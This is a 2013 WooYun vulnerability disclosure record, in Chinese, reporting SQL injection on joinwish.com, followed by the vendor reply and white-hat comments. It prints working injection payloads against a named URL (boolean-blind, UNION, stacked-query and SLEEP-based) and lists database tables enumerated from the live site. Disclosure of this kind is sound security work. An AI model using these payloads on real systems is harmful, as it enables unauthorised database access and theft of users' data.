{"id": 9286, "wybug_id": "wooyun-2013-034511", "wybug_title": "好愿望ROOT权限SQL注射126571条用户数据面临危险", "wybug_corp": "joinwish.com", "wybug_author": "VIP", "wybug_date": "2013-08-16 16:05", "wybug_open_date": "2013-09-30 16:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-30：\t细节向公众公开  简要描述： 听说好愿网很爱发礼物，所以我也跟上节奏来了。 详细说明：  注射点：http://www.joinwish.com/wish/show/id/10067637具体看下面证明   漏洞证明：  \n---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=10067637 AND 1854=1854    Type: UNION query    Title: MySQL UNION query (NULL) - 98 columns    Payload: id=-4416 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a626d71,0x6b485154556c7a687550,0x71706f6871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: id=10067637; SELECT SLEEP(5)--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=10067637 AND SLEEP(5)---\n\nDatabase: huluwu[24 tables]+------------+| accounts   || areas      || auth_user  || backends   || brands     || cities     || cs_logs    || cs_roles   || cs_users   || errors     || invitees   || merchants  || p2p_order  || provinces  || tx_types   || users      || wish_base  || wish_fans  || wish_msgs  || wish_pdts  || wishes     || ym_sms     || ym_sms_mo  || ym_sms_mt  |+------------+Database: huluwu[2 tables]+------------+| areas      || users      |+------------+Database: mysql[11 tables]+------------+| user       || db         || event      || func       || help_topic || plugin     || proc       || procs_priv || servers    || slow_log   || time_zone  |+------------+\n看看用户表有多少数据\n\n看看当前用户\n\n   修复方案：  转义啊过滤啊   版权声明：转载请注明来源 VIP@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-08-19 14:44 厂商回复： 重复漏洞，已修复，今天统一发布 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-16 16:09 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @xsser @Finger @疯狗 他的注射就是大厂商，我们的注射就是小厂商，数据都是一样的详细，那是不是因为标题的原因呢？看来乌云的机制还是十分的不健全。    \n     2013-08-16 16:11 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @VIP  见面分一半。嘎嘎。    \n     2013-08-16 16:12 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  @小胖子 好嘞，一人一半    \n     2013-08-16 16:15 |    \t\tz7y \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:9        | 关注技术与网络安全)\t\t \n  @VIP @小胖子 那我呢,俩基友！！    \n     2013-08-16 16:23 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @小胖子 证明细节上真的还是差一点的 - -     \n     2013-08-16 16:23 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @小胖子 差异确实不是很多 但很关键    \n     2013-08-16 16:30 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @疯狗 看来这是乌云鼓励我们把目标的库脱一遍了来证明危害啊！？看来跟猪猪侠说的一样，有时候我们替别人考虑，别人是不会领你的情的。    \n     2013-08-16 17:10 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @小胖子 不是这个意思，你误解了，这个漏洞里面有个挺用心的证明点，可以公开后看。    \n     2013-08-16 17:25 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  我的基本上都是小厂商..习惯了     \n     2013-08-16 18:20 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  好像好愿网的洞子都是待确认。    \n     2013-08-16 22:45 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  现在看到数字就怕..    \n     2013-08-17 13:26 |    \t\t小痞子 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:21        | <xss>alert(\"a\")</xss>￥&@&……dssKhwjcw...)\t\t \n  目测 忽略！    \n     2013-08-19 13:17 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  好愿网无良已忽略。    \n     2013-08-19 13:31 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @Black Angel 好愿网问我要联系方式了呀，今天应该能确认的，@好愿网  SQL注射的求确认。    \n     2013-08-19 14:17 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  @Black Angel 好愿网问我要联系方式了呀，今天应该能确认的，@好愿网 SQL注射的求确认。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}